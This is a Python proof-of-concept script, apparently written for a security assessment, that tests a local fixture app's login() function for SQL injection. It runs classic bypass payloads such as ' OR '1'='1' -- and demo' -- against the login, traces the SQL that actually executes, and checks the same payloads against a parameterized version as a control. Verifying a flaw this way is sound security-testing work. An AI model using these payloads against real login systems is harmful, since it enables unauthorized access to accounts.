"""Local PoC: SQL injection authentication bypass in app.py login().

Read-only with respect to the fixture: it only imports app.py and calls its
two login functions. No files are modified.
"""
import sqlite3
import sys

sys.path.insert(0, "/workspace/strix-fixture")

import app


def render_query(name, password):
    """Reproduce the exact f-string interpolation app.py:14 performs."""
    return f"SELECT name FROM users WHERE name = '{name}' AND password = '{password}'"


def traced_login(name, password):
    """Call login() while tracing the SQL statement actually executed."""
    statements = []
    original_database = app.database

    def traced_database():
        conn = original_database()
        conn.set_trace_callback(statements.append)
        return conn

    app.database = traced_database
    try:
        result = app.login(name, password)
    finally:
        app.database = original_database
    return result, statements


def main():
    print("=" * 78)
    print("SQL injection authentication bypass PoC - app.py (local fixture)")
    print("=" * 78)

    print("\n[1] BASELINE - ordinary logins (expected behavior)")
    baselines = [
        ("demo", "fixture-password", True),
        ("demo", "wrong", False),
        ("nouser", "x", False),
    ]
    for name, password, expected in baselines:
        vuln = app.login(name, password)
        ctrl = app.login_parameterized(name, password)
        status = "OK" if (vuln == ctrl == expected) else "UNEXPECTED"
        print(f"  login({name!r}, {password!r})={vuln}  "
              f"login_parameterized={ctrl}  expected={expected}  [{status}]")

    print("\n[2] INJECTION - malicious payloads against login()")
    injections = [
        ("demo", "' OR '1'='1' --"),
        ("demo", "' OR 1=1 --"),
        ("' OR '1'='1' --", "x"),
        ("demo' --", "anything"),
        ("' OR 1=1 --", "x"),
    ]
    working = []
    for name, password in injections:
        result, statements = traced_login(name, password)
        flag = "BYPASS" if result else "no bypass"
        print(f"  login({name!r}, {password!r}) -> {result}  [{flag}]")
        if result:
            working.append((name, password))
            print(f"      executed SQL: {statements[0]}")

    print("\n[3] NEGATIVE CONTROL - identical payloads against login_parameterized()")
    for name, password in injections:
        result = app.login_parameterized(name, password)
        flag = "BYPASS" if result else "no bypass"
        print(f"  login_parameterized({name!r}, {password!r}) -> {result}  [{flag}]")

    print("\n[4] RENDERED SQL for each successful bypass payload (app.py:14 interpolation)")
    for name, password in working:
        print(f"  payload name={name!r} password={password!r}")
        print(f"    {render_query(name, password)}")

    print("\n[5] SUMMARY")
    print(f"  successful bypass payloads on login(): {len(working)}/{len(injections)}")
    if working:
        name, password = working[0]
        conn = sqlite3.connect(":memory:")
        conn.execute("CREATE TABLE users (name TEXT, password TEXT)")
        conn.execute("INSERT INTO users VALUES (?, ?)", ("demo", "fixture-password"))
        row = conn.execute(render_query(name, password)).fetchone()
        print(f"  row returned by bypass query: {row!r}")
        print("  VERDICT: authentication bypass CONFIRMED - login() returns True "
              "for attacker input that is not the seeded credential.")


if __name__ == "__main__":
    main()
